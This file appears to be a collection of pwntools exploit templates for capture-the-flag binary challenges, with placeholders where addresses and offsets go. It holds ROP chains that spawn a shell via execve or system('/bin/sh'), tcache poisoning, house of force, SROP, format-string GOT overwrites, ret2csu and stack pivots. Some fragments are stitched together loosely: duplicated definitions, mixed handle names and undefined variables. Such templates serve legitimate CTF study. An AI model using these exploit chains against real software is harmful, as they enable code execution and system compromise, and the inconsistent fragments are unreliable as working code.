from pwn import *

context(os='linux', arch='amd64', log_level='debug')
elf = ELF('{{BINARY_PATH}}')


def start():
    if args.REMOTE:
        return remote('{{HOST}}', {{PORT}})
    return process(elf.path)

p = start()

def start():
    if args.REMOTE:
        return remote('{{HOST}}', {{PORT}})
    return process('{{BINARY_PATH}}')

p = start()

offset = {{OFFSET}}
syscall = {{SYSCALL_GADGET}}
pop_rax = {{POP_RAX}}
pop_rdi = {{POP_RDI}}
pop_rsi = {{POP_RSI}}
pop_rdx = {{POP_RDX}}
binsh = {{BINSH_ADDR}}

payload  = b'A' * offset
payload += p64(pop_rax) + p64(59)
payload += p64(pop_rdi) + p64(binsh)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(syscall)
p.sendline(payload)

def choice(idx):
    p.sendlineafter(b'> ', str(idx).encode())

def add(data):
    choice(1)
    p.sendafter(b'data: ', data)

def delete(idx):
    choice(2)
    p.sendlineafter(b'index: ', str(idx).encode())

def show(idx):
    choice(3)
    p.sendlineafter(b'index: ', str(idx).encode())

import base64

std=b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
custom=b'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/'
enc_table=bytes.maketrans(std,custom)

def base64enc(data):
    return base64.b64encode(data).translate(enc_table)

def base64num(num):
    s=str(num).encode()
    return base64.b64encode(s).translate(enc_table)

offset = {{OFFSET}}
system_addr = {{SYSTEM_ADDR}}
binsh = {{BINSH_ADDR}}
fake_ret = {{RETURN_ADDR}}

payload  = b'A' * offset
payload += p32(system_addr)
payload += p32(fake_ret)
payload += p32(binsh)
p.sendline(payload)

def choice(idx):
    io.sendlineafter(b'> ', str(idx).encode())

def add(size, data=b'A'):
    choice(1)
    io.sendlineafter(b'size: ', str(size).encode())
    io.sendafter(b'content: ', data)

def edit(idx, data):
    choice(2)
    io.sendlineafter(b'index: ', str(idx).encode())
    io.sendafter(b'content: ', data)

def delete(idx):
    choice(3)
    io.sendlineafter(b'index: ', str(idx).encode())

def show(idx):
    choice(4)
    io.sendlineafter(b'index: ', str(idx).encode())

size = {{REQUEST_SIZE}}
fd_storage = {{FD_STORAGE_ADDR}}
target = {{TARGET_ADDR}}
encoded_fd = target ^ (fd_storage >> 12)
log.info(f'encoded fd = {hex(encoded_fd)}')
edit({{CHUNK_A_INDEX}}, p64(encoded_fd))
add(size, b'A')
add(size, p64({{WRITE_VALUE}}))

fake_chunk = {{FAKE_CHUNK_ADDR}}
payload  = b'A' * {{PADDING_LEN}}
payload += p64(0) + p64({{CHUNK_SIZE}})
payload += p64(fake_chunk)
io.sendline(payload)
# 后续释放指向 fake_chunk 的指针，再申请同 size 取回 fake chunk

top_addr = {{TOP_CHUNK_ADDR}}
target = {{TARGET_ADDR}}
padding = {{PADDING_LEN}}
edit({{CHUNK_A_INDEX}}, b'A' * padding + p64(0xffffffffffffffff))
request_size = target - top_addr - 0x20
add(request_size, b'pad')
add({{REQUEST_SIZE}}, {{FINAL_PAYLOAD}})

setcontext = libc.symbols['setcontext'] + {{SETCONTEXT_OFFSET}}
rop_addr = {{ROP_ADDR}}
ret_addr = {{RET_ADDR}}
frame = SigreturnFrame()
frame.rsp = rop_addr
frame.rip = ret_addr
# 常见入口：exit handlers / IO_FILE / tcache poisoning 指向的控制流目标
log.info(f'setcontext = {hex(setcontext)}')

# 先插入/设置 low/high，再构造 payload；offset 指向 payload 末尾追加的第一个地址。
fmt_offset = {{FMT_OFFSET}}
printf_got = {{TARGET_ADDR}}
write_targets = [(0, printf_got, low), (1, printf_got + 2, high)]
fmt = b''
printed = {{NUMBWRITTEN}}
for slot, addr, value in sorted(write_targets, key=lambda item: item[2]):
    pad = (value - printed) % 0x10000
    if pad:
        fmt += f'%{pad}c'.encode()
    fmt += f'%{fmt_offset + slot}$hn'.encode()
    printed = value
payload = fmt.ljust(((len(fmt) + 3) // 4) * 4, b'A')
payload += b''.join(p32(addr) for _slot, addr, _value in write_targets)
payload += b'\n'
# 按题目输入点发送，例如：io.sendlineafter({{PROMPT}}, payload)

def start(argv=[]):
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript='continue')
    if args.REMOTE:
        return remote(args.HOST or '{{HOST}}', int(args.PORT or {{PORT}}))
    return process([elf.path] + argv)

io = start()

def sla(prompt, data): io.sendlineafter(prompt, str(data).encode())
def sa(prompt, data): io.sendafter(prompt, data)
def choice(n): sla(b'> ', n)

rop = ROP(elf)
csu_pop = {{CSU_POP}}
csu_call = {{CSU_CALL}}
rop.raw(csu_pop)
rop.raw([0, 1, {{CALL_TARGET}}, {{ARG1}}, {{ARG2}}, {{ARG3}}, csu_call, b'\x00' * 0x38])

pivot = {{PIVOT_ADDR}}
leave_ret = {{LEAVE_RET}}
payload = flat({{OFFSET}}, pivot - 8, leave_ret)
io.send(payload)

def exec_fmt(payload):
    io.sendline(payload)
    return io.recv()
auto = FmtStr(exec_fmt)
offset = auto.offset
payload = fmtstr_payload(offset, { {{TARGET}}: {{VALUE}} }, write_size='short')

# 先填满 tcache，再布局 smallbin/fake chunk
for _ in range(7): add({{SIZE}}, b'A')
# free / consolidate / malloc 触发 stashing unlink

file = IO_FILE_plus()
file._lock = {{LOCK_ADDR}}
file._wide_data = {{WIDE_DATA}}
file.vtable = {{VTOCPLAY}}
# 需按 libc 版本和触发点补齐字段并运行时验证

# seccomp-tools dump ./pwn
blocked = {b'execve', b'execveat'}
if blocked & set({{SYSCALLS}}): log.info('优先 ORW，不走 shell')

io.timeout = {{TIMEOUT}}
try:
    io.sendlineafter(b'{{PROMPT}}', payload)
except EOFError:
    io.close()
    io = start()
